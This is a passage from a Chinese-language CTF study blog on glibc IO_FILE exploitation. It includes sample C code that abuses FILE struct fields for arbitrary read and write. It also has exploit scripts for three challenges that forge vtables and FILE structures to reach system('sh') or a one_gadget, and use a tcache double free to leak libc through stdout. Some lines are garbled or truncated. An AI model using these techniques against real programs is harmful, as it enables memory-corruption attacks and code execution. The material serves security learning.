                            unpredictable. */
                         fp->_old_offset = _IO_pos_BAD;
                       else if (fp->_IO_read_end != fp->_IO_write_base)
                         {
                           off_t new_pos
                         = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
                           if (new_pos == _IO_pos_BAD)
                         return 0;
                           fp->_old_offset = new_pos;
                         }
  * 样例
        #include 
    int main()
    {
        char *msg = "treebacker";
        FILE* fp;
        char *buf = malloc(100);
        read(0, buf, 100);
        fp = fopen("key.txt", "rw");
        fp->_flags &= ~8;
        fp->_flags |= 0x800;
        fp->_IO_write_base = msg;
        fp->_IO_write_ptr = msg+10;
        fp->_IO_read_end = fp->_IO_write_base;
        fp->_fileno = 1;
        fwrite(buf, 1, 100, fp);/*leak msg*/
    }
结果会输出msg的内容，而不是buf的内容。且是输出到stdout。
  * ##### 利用fread函数任意地址写。
    * 绕过检查的设置
      * _fileno = stdin（从stdin读入）
_flags &= ~ _IO_NO_READS（可写入）
      * read_ptr = read_base = null
      * buf_base指向写入的始地址；buf_end指向写入的末地址。
      * 需要 buf_end - buf_base  0)
           {
             have = fp->_IO_read_end - fp->_IO_read_ptr;
             //缓冲区的内容已经足够，直接memcpy过去。
             if (want _IO_read_ptr, want);
           fp->_IO_read_ptr += want;
           want = 0;
         }
           ........................
        }
           /* If we now want less than a buffer, underflow and repeat
              the copy.  Otherwise, _IO_SYSREAD directly to
              the user buffer. */
           if (fp->_IO_buf_base
               && want _IO_buf_end - fp->_IO_buf_base))
             {
               if (__underflow (fp) == EOF)
             break;
               continue;
             }
    * 样例
        #include 
    int main()
    {
      FILE* fp;
      char *buf = malloc(100);
      char msg[100];
      fp = fopen("key.txt", "r");
      fp->_flags &= ~4;
      fp->_IO_buf_base = msg;
      fp->_IO_buf_end = msg+100;
      fp->_fileno = 0;
      fread(buf,1,6,fp);          //read to msg
      puts(msg);
    }
结果，我们会发现输入的内容存于msg中。
    * 当程序中不存在任何的文件操作时，要知道我们一直用的标准输入输出函数也可以利用。
      * scanf/printf/gets/puts；这些函数最终会调用底层的read和write函数。
      * 他们的文件描述符时stdin、stdout。
      * 覆写缓冲区指针，仍可以任意地址写、读。
#### 实战
  * ##### 2018 HCTF the_end
    * 漏洞分析，存在一个任意地址写漏洞，可以5次，每次1byte。
    * 利用思路A
      * 利用IO FILE，在exit之后，会调用file_list_all里的函数setbuf。如果我们可以伪造setbuf为one_gadgets就可以利用。
      * 坑点1，寻找vtables在libc.so文件的偏移（存储vtbales地址的地址）。
        * 下面的都是假的
        * 这个才是真的
      * 坑点2，伪造vtables。需要满足我们能够写入的字节数目，在真实的vtables附近寻找。且0x68偏移的位置的值与one_gadget值相差3byte内。
    * exp记录
```python  
vtables_addr = libc_base + 0x3c56f8  
one_gadget = libc_base + 0x45216
fake_vtables = libc_base + 0x3c5588  
target_addr = fake_vtables + 0x58 #setbuf
print "one_gadget ==> " + hex(one_gadget)  
print "vtables ==> " + hex(vtables_addr)  
print "fake_vtables ==> " + hex(fake_vtables)  
print "target_addr ==> " + hex(target_addr)
dbg()  
p.recvline()  
for i in range(2): #make a fake_vtables  
p.send(p64(vtables_addr+i))  
p.send(p64(fake_vtables)[i])
    for i in range(3):                              #make setbuf is one_gadget
        p.send(p64(target_addr+i))
        p.send(p64(one_gadget)[i])
    ```
  * 利用思路B
    * 利用exit函数退出时会调用_dl_fini_函数，里面会有一个函数指针，_rtdl_global的一个偏移。调试获得之后，改写这里为one_gadget即可。
                # call   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 
        target = libc.address + 0x5f0f48
        sleep(0.1)
        for i in range(5):
            p.send(p64(target + i))
            sleep(0.1)
            p.send(one_gadget[i])
  * ##### pwntable的seethefile
    * 漏洞分析，name字段scanf存在溢出，可以覆盖fd， **伪造一个FILE结构** 。可以利用flush或者close达到任意代码执行的目的。
    * 利用过程
      * 伪造file结构
        * 设置_flags & 0x2000 = 0
      * 设置read_ptr为";sh"
    * 伪造vtable，设置flush字段为system
    * exp记录
        name = 'a'*0x20
    name += p32(fake_file_addr)       #*fd = fake_file_addr
    #padding
    fake_file = "\x00" * (fake_file_addr - fd_addr -4)
    #file struct
    fake_file += ((p32(0xffffdfff) + ";sh").ljust(0x94, '\x00'))
    #fake vtable_addr
    fake_file += p32(fake_file_addr + 0x98)   
    #fake_vtables     
    fake_file += p32(system_addr)*21
    exit(name + fake_file)
  * [BUUCTF ciscn_2019_en_3](https://buuoj.cn/challenges)
    * 这是个ubuntu18下面的堆利用。（前面记录过的Tcache机制）
      * 漏洞分析，程序只提供了add和delete功能（edit和show是无效的）。其中add操作虽然没有溢出，但却是对输入无截断的。
      * 漏洞在delete下，存在double free（dup）
    * 利用思路
      * 这题最重要在于如何泄露libc地址。由于没有可以正常输出chunk内容的方式，一般向这种直接没办法正常输出的，就是需要IO登场了。
      * 输出，自然是s在stdout上做文章。
      * 最终，我们只需要改写_IO_write_base，指向一个地址，该地址可以泄露出__IO_file_jumps地址。
    * 利用过程（exp详解）
      * 利用unsorted bin和tcache重叠（错位）的过程中，写入tcache第一个chunk的fd指向main_arena。和stdout相差就是偏移的差别，完全可以爆破。
                        prepare()
              add(0x80, '0000')
              add(0x80, '1111')
              add(0x80, '2222')
              add(0x80, '3333')
              add(0x80, '4444')
              add(0x80, '5555')
              add(0x80, '6666')
              add(0x80, '7777')
              add(0x80, '8888')           #avoid consilate with top chunk
              #fill the tcache
              for i in range(7):
                  delete(i)
              gdb.attach(p, 'b printf')
              dbg()
              #free into unsorted bin
              delete(7)
              #double free 6, 5 which is near to idx7, into unsorted bin,
              delete(6)               
              delete(5)
此时，unsorted bin和tcache已经存存在重叠。
      * 再请求chunk，这一次使得我们可以写入tcache的fd指针。
                        add(0xa0, 'a'*0x90 + '\x60\x87') #idx8 from unsorted bin idx5\6,  overwrite                               #idx5's fd is stdout
可以看到，tcache的fd指针已经改写了；发现我们伪造的和stdout不一样，没关系，在调试的时候，可以手动改一下。 **set {unsigned
int}addr=value**
      * 分配两次两次，可以得到stdout的chunk。
      * 我们先看一看stdout的结构。
注意，上面标注的1的位置就是_IO_write_base，2是__IO_file_jumps的位置。换句话说，我们把1低位覆盖为0，就可以泄露libc地址。
                        #get a chunk from points to stdout
              add(0x80, p64(0xfbad1800) + p64(0)*3 + '\x00')  #idx10 change _flags, _IO_write_base                    
              data = p.recv(0x60)
              leak = u64(data[0x58:])                                 #io_file jump
              print "leak ==> " + hex(leak)
_flags和其他检查的绕过根据上面提到的 **利用fwrite** 任意读来构造。
已经可以拿到了libc地址。
      * 其他的就是和double dup一样的操作拿到shell。这里有个坑就是，不可以继续add和tcache存有同样大小的chunk，因为我们改过fd导致后面的chunk都是不合法的，会触发异常。具体地，调试的时候注意调整。
#### 学习链接
  * [IO_FILE通用利用模板](https://www.jianshu.com/p/a6354fa4dbdf)
  * [AngleBoy关于IO_FILE的Slide](https://www.slideshare.net/AngelBoy1/)